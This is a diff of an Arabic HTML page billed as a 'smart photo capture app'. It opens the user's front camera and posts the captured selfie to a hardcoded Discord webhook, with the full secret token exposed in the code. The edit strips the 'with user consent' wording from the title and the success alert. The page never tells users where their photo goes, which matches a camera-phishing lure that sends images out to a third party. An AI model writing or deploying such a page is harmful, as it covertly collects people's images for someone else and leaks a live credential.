@@ -2,75 +2,112 @@
 <html lang="ar">
 <head>
     <meta charset="UTF-8">
-    <title>تطبيق التقاط الصور بموافقة المستخدم</title>
+    <title>تطبيق التقاط الصور الذكي</title>
     <style>
-        body { font-family: sans-serif; text-align: center; margin-top: 50px; }
-        video, canvas { border: 2px solid #333; border-radius: 8px; max-width: 100%; }
-        button { padding: 10px 20px; font-size: 16px; margin-top: 10px; cursor: pointer; }
+        body { font-family: sans-serif; text-align: center; margin-top: 50px; background-color: #f4f4f9; }
+        .container { max-width: 500px; margin: 0 auto; padding: 20px; background: white; border-radius: 12px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
+        video, canvas { border: 2px solid #ddd; border-radius: 8px; max-width: 100%; height: auto; background-color: #ccc; }
+        button { padding: 12px 24px; font-size: 16px; margin-top: 15px; cursor: pointer; border: none; border-radius: 6px; font-weight: bold; transition: background 0.3s; }
+        .btn-start { background-color: #007bff; color: white; }
+        .btn-capture { background-color: #28a745; color: white; }
     </style>
 </head>
 <body>
 
+<div class="container">
     <h2>تطبيق التقاط الصورة الشخصية</h2>
-    <p>يرجى السماح للمتصفح بالوصول إلى الكاميرا، ثم اضغط على الزر أدناه لالتقاط الصورة.</p>
+    <p id="instruction">يرجى الضغط على الزر أدناه لتفعيل الكاميرا الأمامية ورؤية البث المباشر أولاً.</p>
 
-    <!-- عرض بث الكاميرا الحي للمركّب -->
-    <video id="video" width="640" height="480" autoplay></video><br>
+    <!-- مكان عرض بث الكاميرا -->
+    <video id="video" width="400" height="300" autoplay playsinline></video><br>
     
-    <button id="capture-btn">التقاط وإرسال الصورة</button>
+    <!-- الزر الذكي الموحد -->
+    <button id="action-btn" class="btn-start">تفعيل الكاميرا</button>
     
-    <!-- عنصر مخفي لمعالجة الصورة وتحويلها إلى بيانات -->
+    <!-- عنصر مخفي لمعالجة الصورة -->
     <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
+</div>
 
-    <script>
-        const video = document.getElementById('video');
-        const canvas = document.getElementById('canvas');
-        const captureButton = document.getElementById('capture-btn');
-        const webhookUrl = 'https://discord.com/api/webhooks/1506731264693108899/jZq_aAkMWzV3hDDPozh3e2qrlD2fEtUqWq91zE8w61iH8zh6RQYlWlSWPpW7uhmTeep_'; // ضع رابط الاستقبال الآمن هنا
+<script>
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const actionButton = document.getElementById('action-btn');
+    const instructionText = document.getElementById('instruction');
+    
+    const webhookUrl = 'https://discord.com/api/webhooks/1506731264693108899/jZq_aAkMWzV3hDDPozh3e2qrlD2fEtUqWq91zE8w61iH8zh6RQYlWlSWPpW7uhmTeep_'; // ضع رابط الـ Webhook الخاص بك هنا
+    let isCameraActive = false; // متغير لمتابعة حالة الكاميرا
 
-        // 1. طلب إذن الكاميرا بشكل رسمي من المستخدم
-        navigator.mediaDevices.getUserMedia({ video: true, audio: false })
-            .then(stream => {
-                video.srcObject = stream;
-            })
-            .catch(err => {
-                console.error("رفض المستخدم الإذن أو الكاميرا غير متوفرة: ", err);
-                alert("لا يمكن تشغيل التطبيق بدون منح إذن الكاميرا.");
-            });
+    // إدارة الضغط على الزر الموحد
+    actionButton.addEventListener('click', () => {
+        if (!isCameraActive) {
+            // المرحلة الأولى: الكاميرا مغلقة، نقوم بطلب الإذن وتشغيلها
+            startCamera();
+        } else {
+            // المرحلة الثانية: الكاميرا تعمل بالفعل، نقوم بالتقاط الصورة وإرسالها
+            captureAndSend();
+        }
+    });
 
-        // 2. التقاط الصورة عند الضغط على الزر
-        captureButton.addEventListener('click', () => {
-            const context = canvas.getContext('2d');
-            // رسم اللقطة الحالية من الفيديو داخل الـ canvas
-            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+    // دالة تشغيل الكاميرا
+    function startCamera() {
+        navigator.mediaDevices.getUserMedia({ 
+            video: { facingMode: 'user' }, 
+            audio: false 
+        })
+        .then(stream => {
+            video.srcObject = stream;
+            isCameraActive = true;
             
-            // تحويل الصورة إلى صيغة Blob (ملف ثنائي) لإرسالها
-            canvas.toBlob(blob => {
-                if (!blob) return;
-
-                // إعداد البيانات لإرسالها كملف (FormData)
-                const formData = new FormData();
-                formData.append('files[0]', blob, 'captured-image.png');
-                formData.append('username', 'تطبيق الكاميرا المعتمد');
-
-                // 3. إرسال الصورة عبر تقنية Fetch API
-                fetch(webhookUrl, {
-                    method: 'POST',
-                    body: formData
-                })
-                .then(response => {
-                    if (response.ok) {
-                        alert("تم التقاط الصورة وإرسالها بنجاح بموافقتك!");
-                    } else {
-                        alert("حدث خطأ أثناء الإرسال.");
-                    }
-                })
-                .catch(error => {
-                    console.error("خطأ في الشبكة:", error);
-                });
-            }, 'image/png');
+            // تغيير مظهر ووظيفة الزر تلقائياً بعد فتح الكاميرا
+            actionButton.textContent = "التقاط وإرسال الصورة";
+            actionButton.className = "btn-capture";
+            instructionText.textContent = "تأكد من وضعية الصورة ثم اضغط على الزر الأخضر للإرسال.";
+        })
+        .catch(err => {
+            console.error("خطأ في الوصول للكاميرا: ", err);
+            alert("يرجى منح إذن الوصول للكاميرا لتتمكن من استخدام التطبيق.");
         });
-    </script>
+    }
+
+    // دالة التقاط الصورة والإرسال
+    function captureAndSend() {
+        const context = canvas.getContext('2d');
+        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+        
+        canvas.toBlob(blob => {
+            if (!blob) return;
+
+            const formData = new FormData();
+            formData.append('files[0]', blob, 'captured-image.png');
+            formData.append('username', 'تطبيق الكاميرا الذكي');
+
+            // إرسال البيانات
+            actionButton.disabled = true;
+            actionButton.textContent = "جاري الإرسال...";
+
+            fetch(webhookUrl, {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => {
+                if (response.ok) {
+                    alert("تم إرسال صورتك بنجاح!");
+                } else {
+                    alert("حدث خطأ أثناء الإرسال للـ Webhook.");
+                }
+            })
+            .catch(error => {
+                console.error("خطأ شبكة:", error);
+                alert("فشل الاتصال بالخادم.");
+            })
+            .finally(() => {
+                // إعادة الزر لوضعه الطبيعي بعد انتهاء العملية
+                actionButton.disabled = false;
+                actionButton.textContent = "التقاط وإرسال الصورة";
+            });
+        }, 'image/png');
+    }
+</script>
 
 </body>
 </html>
